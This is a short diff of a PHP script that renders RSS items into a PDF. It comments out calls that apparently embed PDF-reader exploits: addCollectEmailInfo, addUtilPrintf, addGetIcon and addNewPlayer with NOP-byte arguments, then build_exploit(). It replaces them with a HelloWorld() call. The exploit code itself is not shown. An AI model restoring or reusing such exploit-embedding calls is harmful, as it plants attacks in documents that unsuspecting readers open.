@@ -13,11 +13,14 @@ for($i=0;$i<count($rss);$i++) {
 	$pdf->SetFont('Arial','',16);
 	$pdf->WriteHTML($rss[$i]['description']);
 }
-$pdf->addCollectEmailInfo("\x90");
-$pdf->addUtilPrintf("\x90");
-$pdf->addGetIcon("\x90");
-$pdf->addNewPlayer("\x90");
-$pdf->build_exploit();
+
+//$pdf->addCollectEmailInfo("\x90");
+//$pdf->addUtilPrintf("\x90");
+//$pdf->addGetIcon("\x90");
+//$pdf->addNewPlayer("\x90");
+//$pdf->build_exploit();
+
+$pdf->HelloWorld();
 $pdf->Output();
 
 ?>
